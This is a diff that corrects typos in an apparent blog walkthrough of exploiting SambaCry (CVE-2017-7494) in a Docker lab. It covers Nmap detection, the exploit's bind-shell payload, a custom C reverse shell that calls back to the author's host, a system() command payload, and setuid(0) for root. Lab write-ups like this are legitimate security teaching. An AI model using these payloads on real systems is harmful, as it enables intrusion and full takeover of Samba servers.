@@ -39,7 +39,7 @@ If you get the message : Cannot connect to the Docker daemon... try to start doc
 service docker start
 ```
 <br>
-In case you would like to conect to the docker machine you need to do two things. First determinate the container ID then connect to the container.
+In case you would like to connect to the docker machine you need to do two things. First determinate the container ID then connect to the container.
 <br>
 ```
 docker ps
@@ -50,7 +50,7 @@ docker exec -ti id bash
 <br>
 <h2>Detection</h2>
 <br>
-So we want to detect if the taget is vulnerable to Sambacry. We will use Nmap for this.
+So we want to detect if the target is vulnerable to Sambacry. We will use Nmap for this.
 <br>
 ```
 nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 127.0.0.1
@@ -70,7 +70,7 @@ cd exploit-CVE-2017-7494
 pip install -r requirements.txt
 ```
 <br>
-Now we have all setup. But before running it, Let's check the code. Starting with exploit.py we should go down until the __main__ function. Here is where are code execution starts. 
+Now we have all setup. But before running it, Let's check the code. Starting with exploit.py we should go down until the __main__ function. Here is where code execution starts. 
 <br>
 ```
     ap = ArgumentParser(description="Sambacry (CVE-2017-7494) exploit by opsxcq")
@@ -88,9 +88,9 @@ Under that we can see a port already set up to 445. We can change it but SMB wil
 First we open the smb connection to the target. Then we try to upload the file given in the parameter. Then we execute the exploit.
 <br>
 <h2>Exploit execution</h2>
-This is the actual exploitation part. So far only the exploit code has been uploaded. If everything goes right, this few line will execute the uploaded code. The main idea is, that Samba can load libraries from shared locations. 
+This is the actual exploitation part. So far only the exploit code has been uploaded. If everything goes right, this few line will execute the uploaded code. The main idea is that Samba can load libraries from shared locations. 
 This information will be handy because we know now that only special files can be uploaded and executed. Now, for the execution to work, we need the full path of the uploaded payload. This is the point where in case the payload does not seem to execute,
-you need to make adjustments. The actual malformed request should not be changed just the parameters. First let's not update the code here, but give ourself a better view on what's actually happening by writhing the actual malformed request to console.
+you need to make adjustments. The actual malformed request should not be changed just the parameters. First let's not update the code here, but give yourself a better view on what's actually happening by writing the actual malformed request to the console.
 Modified code:
 <br>
 ```
@@ -104,11 +104,11 @@ Modified code:
     triggerThread.start()
 ```
 <br>
-After this we only have the handler. In case our payload is a bind shell, this handler will conect to it. We can delete this if we want to connect with a different methode. 
-There is also a test if the exploit was successfull or not. Uname -a will run when the handler extabilish connection.
+After this we only have the handler. In case our payload is a bind shell, this handler will connect to it. We can delete this if we want to connect with a different methode. 
+There is also a test if the exploit was successful or not. Uname -a will run when the handler establishes connection.
 <br>
 <h2>Payload</h2>
-Let's check the payload givven for this exploit. This is a bind shell written in C. Looking at the code of bindshell-samba.c we can see a nicely commented code. Without going into much details, the only thing we need to take a look is where the port is set.
+Let's check the payload given for this exploit. This is a bind shell written in C. Looking at the code of bindshell-samba.c we can see a nicely commented code. Without going into much details, the only thing we need to take a look is where the port is set.
 <br>
 ```
     hostAddr.sin_family = AF_INET;
@@ -136,26 +136,24 @@ With that tiny little modification, the exploit is ready to run. By using the gi
 ![firstRun](/img/EternalRed/firstRun.png)
 <br>
 <br>
-Here we can see that the exploit executed, the uname -a run, and we got back a command prompt. The exploit trigger that we wrote on the screen is: ncacn_np:localhost[\pipe\/data/libbindshell-samba.so] . Luckily we do not need modification here because the exploit creator made sure that this variable is easely controllable by the user.
-We can set the -r parameter for the full path of the payload and it should work... for this version. After investigating the metasploit version [is_known_pipename](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/samba/is_known_pipename.rb), I found that it wil try not just the full path, but full path with added "\\\\PIPE\\". 
-It looks like a few version needs this string before the path to work. In case the exploit did not worked, it is possible that "\\\\PIPE\\/sharename/file.so" could work as parameter -r.
+Here we can see that the exploit executed, the uname -a run, and we got back a command prompt. The exploit trigger that we wrote on the screen is: ncacn_np:localhost[\pipe\/data/libbindshell-samba.so] . Luckily we do not need modification here because the exploit creator made sure that this variable is easily controllable by the user.
+We can set the -r parameter for the full path of the payload and it should work... for this version. After investigating the metasploit version [is_known_pipename](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/samba/is_known_pipename.rb), I found that it will try not just the full path, but full path with added "\\\\PIPE\\". 
+It looks like a few versions need this string before the path to work. In case the exploit did not work, it is possible that "\\\\PIPE\\/sharename/file.so" could work as parameter -r.
 <br>
 <h2>Other Payloads</h2>
-We have our bindshell as payload. It is really nice but let's say it is not enought. From now on we will loke at multiple type of payload that we could execute.
+We have our bindshell as payload. It is really nice but let's say it is not enough. From now on we will look at multiple types of payload that we could execute.
 <br>
 <h3>Reverse shell</h3>
-For this I grabbed the first reverseshell written in C that I could find.[is_known_pipename](https://gist.github.com/0xabe-io/916cf3af33d1c0592a90)
-Complie with gcc, run the exploit and fail. like really big fail. Looking at the  machine logs, it was clear what happened. Not any payload can be used here. Let's modify this reverse shell to make it work.
+For this I grabbed the first reverse shell written in C that I could find.[is_known_pipename](https://gist.github.com/0xabe-io/916cf3af33d1c0592a90)
+Compile with gcc, run the exploit and fail. like really big fail. Looking at the  machine logs, it was clear what happened. Not any payload can be used here. Let's modify this reverse shell to make it work.
 <br>
 ![fail](/img/EternalRed/fail.png)
 <br>
-Investigating the error and the already created bind shell a few thing must be done. First the smb will try to search for afunction named samba_init_module. This is where the execution will start. In case this function do not appear in the code, then
-the same error will hapen as on the picture. In the bindshell we can also see a detachFromParent() function. These should be implemented aswell to make sure that the exploit will not hang and the connection can be recieved.
+Investigating the error and the already created bind shell a few things must be done. First the smb will try to search for a function named samba_init_module. This is where the execution will start. In case this function do not appear in the code, then
+the same error will happen as in the picture. In the bindshell we can also see a detachFromParent() function. These should be implemented as well to make sure that the exploit will not hang and the connection can be received.
 We only have one thing to add. That is the IP and the Port that we want to connect back. Here I checked my IP with ifconfig and added that as listening host and 4445 as listening port
 The final reverse shell code:
-
-
-
+<br>
 ```
 
 #include <stdio.h>
@@ -221,11 +219,9 @@ int samba_init_module(void)
 }
 
 ```
-
-
+<br>
 Compile the exploit then run, we will get a reverse shell:
-
-
+<br>
 ```
 gcc -c -fpic reverse.c
 gcc -shared -o reverse.so reverse.o
@@ -236,15 +232,14 @@ gcc -shared -o reverse.so reverse.o
              -u sambacry -p nosambanocry
 			 
 ```
-
-
+<br>
 ![reverseShell](/img/EternalRed/reverse.png)
-
+<br>
 
 <h3>Other execution</h3>
-What if we want to do something else. For example run a command. No problem, we need the the same starting methode name, the detachFromParent methode and some small code to run our command. We will use system() in this case.
-For this test, I will create a new folder in /tmp called test. here is the code samble:
-
+What if we want to do something else. For example, run a command. No problem, we need the same starting method name, the detachFromParent methode and some small code to run our command. We will use system() in this case.
+For this test, I will create a new folder in /tmp called test. here is the code sample:
+<br>
 ```
 #include <stdio.h>
 #include <unistd.h>
@@ -296,10 +291,10 @@ int samba_init_module(void)
 }
 
 ```
+<br>
 
-
-Complie run then execute just like before:
-
+Compile run then execute just like before:
+<br>
 
 ```
 gcc -c -fpic execute.c
@@ -311,18 +306,18 @@ gcc -shared -o execute.so execute.o
              -u sambacry -p nosambanocry
 			 
 ```
-
+<br>
 
 ![commandExecution](/img/EternalRed/Commands.png)
-
+<br>
 
 <h2>Root</h2>
-
-As you may see on the picture aboce, the directory created is owned by nobody. If you tried all the shells above, you will realise that whoami will give back nobody.
+<br>
+As you may see on the picture above, the directory created is owned by nobody. If you tried all the shells above, you will realise that whoami will give back nobody.
 It would be better if we could get root right? Just a little bit of modification is needed here. From the C payload, after detach but before command/shell execution, we can set our uid guid to 0 and become root. 
 Simply add setuid(0) and setgid(0) like this:
 
-
+<br>
 ```
 
 int samba_init_module(void)
@@ -339,17 +334,17 @@ int samba_init_module(void)
 
 ```
 
-
+<br>
 After comply and execute, the test folder is created as root.
-
+<br>
 
 ![root](/img/EternalRed/toroot.png)
-
+<br>
 Works with the original bindshell too.
-
+<br>
 
 ![root](/img/EternalRed/rootbind.png)
-
+<br>
 
 <h2>Summary:</h2>
-We looked at how Sambacry exploit works, analised the exploit payload, and created our own based on the initial bindshell that was included.
+We looked at how Sambacry exploit works, analysed the exploit payload, and created our own based on the initial bindshell that was included.
